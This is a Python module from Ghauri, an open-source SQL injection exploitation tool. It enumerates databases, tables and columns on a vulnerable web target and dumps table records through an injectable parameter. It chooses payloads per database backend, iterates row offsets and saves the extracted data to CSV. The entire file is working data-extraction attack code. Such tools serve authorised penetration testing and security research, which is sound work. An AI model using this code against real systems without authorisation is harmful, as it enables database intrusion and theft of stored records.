#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.core.extract import ghauri_extractor
from ghauri.logger.colored_logger import logger
from ghauri.common.lib import collections
from ghauri.common.colors import mc, nc, bw
from ghauri.common.utils import (
    clean_up_offset_payload,
    prepare_extraction_payloads,
    prettifier,
    to_list,
    replace_with,
    prepare_query_payload,
)
from ghauri.common.payloads import (
    PAYLOADS_DBS_COUNT,
    PAYLOADS_DBS_NAMES,
    PAYLOADS_TBLS_COUNT,
    PAYLOADS_TBLS_NAMES,
    PAYLOADS_COLS_COUNT,
    PAYLOADS_COLS_NAMES,
    PAYLOADS_RECS_COUNT,
    PAYLOADS_RECS_DUMP,
)


class GhauriAdvance:
    """This class will be used to fetch common thing like database, user, version"""

    def __execute_expression(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        suppress_output=False,
        query_check=False,
        list_of_chars=None,
        not_match_string=None,
        code=None,
        text_only=False,
        dump_type=None,
    ):
        retval = ghauri_extractor.fetch_characters(
            url=url,
            data=data,
            vector=vector,
            parameter=parameter,
            headers=headers,
            base=base,
            injection_type=injection_type,
            payloads=payloads,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack,
            match_string=match_string,
            suppress_output=suppress_output,
            query_check=query_check,
            list_of_chars=list_of_chars,
            dump_type=dump_type,
        )
        return retval

    def fetch_dbs(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        start=0,
        stop=None,
        batch=False,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        if start != 0 and start > 0:
            if backend != "Oracle":
                start = start - 1
        logger.info("fetching database names")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "result"],
        )
        _results = set()
        _temp = Response(ok=False, error="", result=[])
        logger.info("fetching number of databases")
        payloads_count = PAYLOADS_DBS_COUNT.get(backend)
        retval = self.__execute_expression(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads_count,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack=attack,
            match_string=match_string,
            suppress_output=True,
            list_of_chars="0123456789",
            not_match_string=not_match_string,
            code=code,
            text_only=text_only,
        )
        if not retval.ok:
            if backend == "Microsoft SQL Server":
                logger.debug(
                    "ghauri could not determine number of databases, using DB_NAME to fetch dbs .."
                )
                payloads_names = PAYLOADS_DBS_NAMES.get(backend)
                payload = None
                total = 0
                guess = self.__execute_expression(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads_names,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack=attack,
                    match_string=match_string,
                    suppress_output=True,
                    query_check=True,
                    not_match_string=not_match_string,
                    code=code,
                    text_only=text_only,
                )
                if guess.ok:
                    payload = guess.payload
                    logger.debug(
                        f"Working payload found for database extraction: '{payload}'"
                    )
                if not payload:
                    logger.critical(
                        "Ghauri was not able identify payload for database(s) fetching, try manually."
                    )
                    return _temp
                payload = clean_up_offset_payload(payload, backend=backend)
                null_counter_limit = 0
                stop = 20
                while start < stop:
                    if null_counter_limit == 3:
                        logger.debug("limit reached..")
                        break
                    _payload = payload.format(offset=start)
                    payloads = [_payload]
                    retval = self.__execute_expression(
                        url,
                        data,
                        vector,
                        parameter,
                        headers,
                        base,
                        injection_type,
                        payloads,
                        backend=backend,
                        proxy=proxy,
                        is_multipart=is_multipart,
                        timeout=timeout,
                        delay=delay,
                        timesec=timesec,
                        attack=attack,
                        match_string=match_string,
                        suppress_output=True,
                        query_check=False,
                        not_match_string=not_match_string,
                        code=code,
                        text_only=text_only,
                        # list_of_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789",
                    )
                    if retval.ok:
                        if retval.result not in _results:
                            logger.debug("retrieved: %s" % (retval.result))
                            _results.add(retval.result)
                    else:
                        null_counter_limit += 1
                    start += 1
                if _results:
                    _results = list(set(list(_results)))
                    total = len(_results)
                    logger.info("retrieved: %s" % (total))
                    for db in _results:
                        logger.info("retrieved: %s" % (db))
                    _temp = Response(ok=True, error="", result=_results)
                    logger.success(f"available databases [{total}]:")
                    for db in _results:
                        logger.success(f"[*] {db}")
            else:
                logger.warning("the SQL query provided does not return any output")
                logger.error("unable to retrieve the number of databases")
                return _temp
        if retval.ok:
            total = 0
            if retval.result.isdigit():
                total = int(retval.result)
            logger.info("retrieved: %s" % (total))
            if total == 0:
                logger.warning("the SQL query provided does not return any output")
                logger.error("unable to retrieve the number of databases")
            if total > 0:
                if not stop:
                    stop = total
                else:
                    if stop and stop > 0:
                        if stop > total:
                            logger.warning(
                                f"--stop={stop} is greater then total count setting it to --stop={total}"
                            )
                            stop = total
                    else:
                        stop = total
                payloads_names = PAYLOADS_DBS_NAMES.get(backend)
                payload = None
                guess = self.__execute_expression(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads_names,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack=attack,
                    match_string=match_string,
                    suppress_output=True,
                    query_check=True,
                    not_match_string=not_match_string,
                    code=code,
                    text_only=text_only,
                )
                if guess.ok:
                    payload = guess.payload
                    logger.debug(
                        f"Working payload found for database extraction: '{payload}'"
                    )
                if not payload:
                    logger.critical(
                        "Ghauri was not able identify payload for database(s) fetching, try manually."
                    )
                    return _temp
                payload = clean_up_offset_payload(payload, backend=backend)
                if (
                    payload
                    and backend == "Microsoft SQL Server"
                    and "DB_NAME" in payload
                ):
                    stop = stop + 1
                if start == 0 and backend == "Oracle":
                    start = 1 if start == 0 else start
                    stop = total + 1 if stop == total else stop + 1
                while start < stop:
                    payloads = prepare_query_payload(
                        backend=backend, offset=start, payload_string=payload
                    )
                    try:
                        retval = self.__execute_expression(
                            url,
                            data,
                            vector,
                            parameter,
                            headers,
                            base,
                            injection_type,
                            payloads,
                            backend=backend,
                            proxy=proxy,
                            is_multipart=is_multipart,
                            timeout=timeout,
                            delay=delay,
                            timesec=timesec,
                            attack=attack,
                            match_string=match_string,
                            suppress_output=True,
                            query_check=False,
                            not_match_string=not_match_string,
                            code=code,
                            text_only=text_only,
                            # list_of_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789",
                            dump_type=f"{start}_dbs",
                        )
                        if retval.ok:
                            if retval.result not in _results:
                                if retval.resumed:
                                    logger.info("resumed: %s" % (retval.result))
                                else:
                                    logger.info("retrieved: %s" % (retval.result))
                                _results.add(retval.result)
                        if not retval.ok and retval.error == "user_ended":
                            break
                    except KeyboardInterrupt:
                        quest = logger.read_input(
                            "user interrupted during data fetching, Do you want to continue? [y/N] ",
                            batch=batch,
                            user_input="N",
                        )
                        if quest == "n":
                            break
                    start += 1
            if _results:
                _temp = Response(ok=True, error="", result=_results)
                logger.success(f"available databases [{total}]:")
                for db in _results:
                    logger.success(f"[*] {db}")
        return _temp

    def fetch_tables(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        start=0,
        stop=None,
        database=None,
        batch=False,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        if start != 0 and start > 0:
            if backend != "Oracle":
                start = start - 1
        logger.info(f"fetching tables for database: {database}")
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "database", "result"],
        )
        _results = set()
        _temp = Response(ok=False, error="", database=database, result=[])
        logger.info(f"fetching number of tables for database '{mc}{database}{nc}'")
        payloads_count = PAYLOADS_TBLS_COUNT.get(backend)
        payloads_count = prepare_extraction_payloads(
            database=database,
            backend=backend,
            payloads=payloads_count,
            is_string=conf.is_string,
        )
        retval = self.__execute_expression(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads_count,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack=attack,
            match_string=match_string,
            suppress_output=True,
            list_of_chars="0123456789",
            not_match_string=not_match_string,
            code=code,
            text_only=text_only,
        )
        if retval.ok:
            total = 0
            if retval.result.isdigit():
                total = int(retval.result)
            logger.info("retrieved: %s" % (total))
            if total == 0:
                logger.warning(f"database '{database}' appears to be empty")
                logger.warning("the SQL query provided does not return any output")
            if total > 0:
                if not stop:
                    stop = total
                else:
                    if stop and stop > 0:
                        if stop > total:
                            logger.warning(
                                f"--stop={stop} is greater then total count setting it to --stop={total}"
                            )
                            stop = total
                    else:
                        stop = total
                payloads_names = PAYLOADS_TBLS_NAMES.get(backend)
                payloads_names = prepare_extraction_payloads(
                    database=database,
                    backend=backend,
                    payloads=payloads_names,
                    is_string=conf.is_string,
                )
                payload = None
                guess = self.__execute_expression(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads_names,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack=attack,
                    match_string=match_string,
                    suppress_output=True,
                    query_check=True,
                    not_match_string=not_match_string,
                    code=code,
                    text_only=text_only,
                )
                if guess.ok:
                    payload = guess.payload
                    logger.debug(
                        f"Working payload found for table(s) extraction: '{payload}'"
                    )
                if not payload:
                    logger.critical(
                        "Ghauri was not able identify payload for table(s) fetching, try manually."
                    )
                    return _temp
                payload = clean_up_offset_payload(payload, backend=backend)
                if start == 0 and backend == "Oracle":
                    start = 1 if start == 0 else start
                    stop = total + 1 if stop == total else stop + 1
                while start < stop:
                    payloads = prepare_query_payload(
                        backend=backend, offset=start, payload_string=payload
                    )
                    try:
                        retval = self.__execute_expression(
                            url,
                            data,
                            vector,
                            parameter,
                            headers,
                            base,
                            injection_type,
                            payloads,
                            backend=backend,
                            proxy=proxy,
                            is_multipart=is_multipart,
                            timeout=timeout,
                            delay=delay,
                            timesec=timesec,
                            attack=attack,
                            match_string=match_string,
                            suppress_output=True,
                            query_check=False,
                            not_match_string=not_match_string,
                            code=code,
                            text_only=text_only,
                            # list_of_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789",
                            dump_type=f"{start}_{database}_tables",
                        )
                        if retval.ok:
                            if retval.resumed:
                                logger.info("resumed: %s" % (retval.result))
                            else:
                                logger.info("retrieved: %s" % (retval.result))
                            if retval.result not in _results:
                                _results.add(retval.result)
                        if not retval.ok and retval.error == "user_ended":
                            break
                    except KeyboardInterrupt:
                        quest = logger.read_input(
                            "user interrupted during data fetching, Do you want to continue? [y/N] ",
                            batch=batch,
                            user_input="N",
                        )
                        if quest == "n":
                            break
                    start += 1
                if _results:
                    _temp = Response(
                        ok=True, error="", database=database, result=_results
                    )
                    ret = prettifier(cursor_or_list=_results, field_names="Tables")
                    logger.success(f"Database: {database}")
                    logger.success(f"[{ret.entries} tables]")
                    logger.success(f"{ret.data}")
        return _temp

    def fetch_columns(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        start=0,
        stop=None,
        database=None,
        table=None,
        batch=False,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        if start != 0 and start > 0:
            if backend != "Oracle":
                start = start - 1
        logger.info(
            f"fetching columns for table '{mc}{table}{bw}' in database '{mc}{database}{bw}'"
        )
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "database", "table", "result"],
        )
        _results = []
        _temp = Response(ok=False, error="", database=database, table=table, result=[])
        logger.info(
            f"fetching number of columns for table '{mc}{table}{bw}' in database '{mc}{database}{bw}'"
        )
        payloads_count = PAYLOADS_COLS_COUNT.get(backend)
        if backend == "Microsoft SQL Server":
            table = table.replace("dbo.", "").replace("sys.", "")
        payloads_count = prepare_extraction_payloads(
            database=database, backend=backend, payloads=payloads_count, table=table
        )
        retval = self.__execute_expression(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads_count,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack=attack,
            match_string=match_string,
            suppress_output=True,
            list_of_chars="0123456789",
            not_match_string=not_match_string,
            code=code,
            text_only=text_only,
        )
        if retval.ok:
            total = 0
            if retval.result.isdigit():
                total = int(retval.result)
            logger.info("retrieved: %s" % (total))
            if total == 0:
                logger.warning("the SQL query provided does not return any output")
            if total > 0:
                if not stop:
                    stop = total
                else:
                    if stop and stop > 0:
                        if stop > total:
                            logger.warning(
                                f"--stop={stop} is greater then total count setting it to --stop={total}"
                            )
                            stop = total
                    else:
                        stop = total
                payloads_names = PAYLOADS_COLS_NAMES.get(backend)
                payloads_names = prepare_extraction_payloads(
                    database=database,
                    backend=backend,
                    payloads=payloads_names,
                    table=table,
                    is_string=conf.is_string,
                )
                payload = None
                guess = self.__execute_expression(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads_names,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack=attack,
                    match_string=match_string,
                    suppress_output=True,
                    query_check=True,
                    not_match_string=not_match_string,
                    code=code,
                    text_only=text_only,
                )
                if guess.ok:
                    payload = guess.payload
                    logger.debug(
                        f"Working payload found for column(s) extraction: '{payload}'"
                    )
                if not payload:
                    logger.critical(
                        "Ghauri was not able identify payload for column(s) fetching, try manually."
                    )
                    return _temp
                payload = clean_up_offset_payload(payload, backend=backend)
                if start == 0 and backend == "Oracle":
                    start = 1 if start == 0 else start
                    stop = total + 1 if stop == total else stop + 1
                while start < stop:
                    payloads = prepare_query_payload(
                        backend=backend, offset=start, payload_string=payload
                    )
                    try:
                        retval = self.__execute_expression(
                            url,
                            data,
                            vector,
                            parameter,
                            headers,
                            base,
                            injection_type,
                            payloads,
                            backend=backend,
                            proxy=proxy,
                            is_multipart=is_multipart,
                            timeout=timeout,
                            delay=delay,
                            timesec=timesec,
                            attack=attack,
                            match_string=match_string,
                            suppress_output=True,
                            query_check=False,
                            not_match_string=not_match_string,
                            code=code,
                            text_only=text_only,
                            dump_type=f"{start}_{database}_{table}_columns",
                        )
                        if retval.ok:
                            if retval.resumed:
                                logger.info("resumed: %s" % (retval.result))
                            else:
                                logger.info("retrieved: %s" % (retval.result))
                            _results.append(retval.result)
                        if not retval.ok and retval.error == "user_ended":
                            break
                    except KeyboardInterrupt:
                        quest = logger.read_input(
                            "user interrupted during data fetching, Do you want to continue? [y/N] ",
                            batch=batch,
                            user_input="N",
                        )
                        if quest == "n":
                            break
                    start += 1
                if _results:
                    _temp = Response(
                        ok=True,
                        error="",
                        database=database,
                        table=table,
                        result=_results,
                    )
                    ret = prettifier(_results, field_names="Columns")
                    logger.success(f"Database: {database}")
                    logger.success(f"Table: {table}")
                    logger.success(f"[{ret.entries} columns]")
                    logger.success(f"{ret.data}")
        return _temp

    def dump_table(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        start=0,
        stop=None,
        database=None,
        table=None,
        columns=None,
        batch=False,
        not_match_string=None,
        code=None,
        text_only=False,
        count_only=False,
    ):
        __columns = to_list(columns)
        if start != 0 and start > 0:
            if backend != "Oracle":
                start = start - 1
        Response = collections.namedtuple(
            "Response",
            ["ok", "error", "database", "table", "result"],
        )
        _results = []
        _temp = Response(ok=False, error="", database=database, table=table, result=[])
        if not count_only:
            logger.info(
                f"fetching entries of column(s) '{mc}{columns}{bw}' for table '{mc}{table}{bw}' in database '{mc}{database}{bw}'"
            )
            logger.info(
                f"{bw}fetching number of column(s) '{mc}{columns}{bw}' entries for table '{mc}{table}{bw}' in database '{mc}{database}{bw}'"
            )
        payloads_count = PAYLOADS_RECS_COUNT.get(backend)
        _column = __columns[-1] if backend == "Microsoft SQL Server" else None
        payloads_count = prepare_extraction_payloads(
            database=database,
            backend=backend,
            payloads=payloads_count,
            table=table,
            column=_column,
            dump=True,
        )
        retval = self.__execute_expression(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads_count,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack=attack,
            match_string=match_string,
            suppress_output=True,
            list_of_chars="0123456789",
            not_match_string=not_match_string,
            code=code,
            text_only=text_only,
            dump_type=f"{database}_{table}_entries" if count_only else None,
        )
        if retval.ok:
            total = 0
            if retval.result.isdigit():
                total = int(retval.result)
            if not retval.resumed:
                logger.info("retrieved: %s" % (total))
            if retval.resumed:
                logger.info("resumed: %s" % (total))
            if count_only:
                _results = [[f"{table}", f"{total}"]]
                _temp = Response(
                    ok=True,
                    error="",
                    database=database,
                    table=table,
                    result=_results,
                )
                ret = prettifier(_results, field_names="Table, Entries", header=True)
                logger.success(f"Database: {database}")
                logger.success(f"{ret.data}")
                return _temp
            if total == 0:
                logger.warning("the SQL query provided does not return any output")
            if total > 0:
                if not stop:
                    stop = total
                else:
                    if stop and stop > 0:
                        if stop > total:
                            logger.warning(
                                f"--stop={stop} is greater then total count setting it to --stop={total}"
                            )
                            stop = total
                    else:
                        stop = total
                payloads_names = PAYLOADS_RECS_DUMP.get(backend)
                payloads_names = prepare_extraction_payloads(
                    database=database,
                    backend=backend,
                    payloads=payloads_names,
                    table=table,
                    column=__columns[-1],
                    dump=True,
                )
                payload = None
                guess = self.__execute_expression(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads_names,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack=attack,
                    match_string=match_string,
                    suppress_output=True,
                    query_check=True,
                    not_match_string=not_match_string,
                    code=code,
                    text_only=text_only,
                )
                if guess.ok:
                    payload = guess.payload
                    logger.debug(f"Working payload found for table dump: '{payload}'")
                if not payload:
                    logger.critical(
                        "Ghauri was not able identify payload for table dump, try manually."
                    )
                    return _temp
                payload = clean_up_offset_payload(
                    payload, backend=backend, column=__columns[-1]
                )
                if backend == "Microsoft SQL Server":
                    if "LIMIT=" in payload:
                        stop = total + 1 if stop == total else stop + 1
                        start = 1 if start == 0 else start
                    if payload.endswith("WHERE 1=1)"):
                        logger.warning(
                            "it was not possible to dump all of the entries for the SQL query provided. Ghauri will assume that it returns only one entry"
                        )
                        start = 1
                        stop = 2
                if start == 0 and backend == "Oracle":
                    start = 1 if start == 0 else start
                    stop = total + 1 if stop == total else stop + 1
                while start < stop:
                    __temp = []
                    is_user_ended = False
                    is_interrupted = False
                    for column_name in __columns:
                        payloads = prepare_query_payload(
                            backend=backend,
                            offset=start,
                            payload_string=payload,
                            column_name=column_name,
                        )
                        try:
                            retval = self.__execute_expression(
                                url,
                                data,
                                vector,
                                parameter,
                                headers,
                                base,
                                injection_type,
                                payloads,
                                backend=backend,
                                proxy=proxy,
                                is_multipart=is_multipart,
                                timeout=timeout,
                                delay=delay,
                                timesec=timesec,
                                attack=attack,
                                match_string=match_string,
                                suppress_output=True,
                                query_check=False,
                                not_match_string=not_match_string,
                                code=code,
                                text_only=text_only,
                                dump_type=f"{start}_{database}_{table}_{column_name}_dump",
                            )
                            if retval.ok:
                                if retval.result not in __temp:
                                    if retval.resumed:
                                        logger.info("resumed: %s" % (retval.result))
                                    else:
                                        logger.info("retrieved: %s" % (retval.result))
                                    __temp.append(retval.result)
                            if not retval.ok and retval.error == "user_ended":
                                is_user_ended = True
                                break
                        except KeyboardInterrupt:
                            quest = logger.read_input(
                                "user interrupted during data fetching, Do you want to continue? [y/N] ",
                                batch=batch,
                                user_input="N",
                            )
                            if quest == "n":
                                is_interrupted = True
                                break
                    if is_user_ended:
                        break
                    if __temp:
                        if len(__temp) == len(__columns):
                            _results.append(__temp)
                    if is_interrupted:
                        break
                    start += 1
                if _results:
                    _temp = Response(
                        ok=True,
                        error="",
                        database=database,
                        table=table,
                        result=_results,
                    )
                    ret = prettifier(_results, field_names=columns, header=True)
                    logger.success(f"Database: {database}")
                    logger.success(f"Table: {table}")
                    logger.success(f"[{ret.entries} entries]")
                    logger.success(f"{ret.data}")
                    try:
                        session.dump_to_csv(
                            _results,
                            field_names=__columns,
                            filepath=conf.session_filepath,
                            database=database,
                            table=table,
                        )
                    except Exception as error:
                        logger.debug(error)
        return _temp


target_adv = GhauriAdvance()
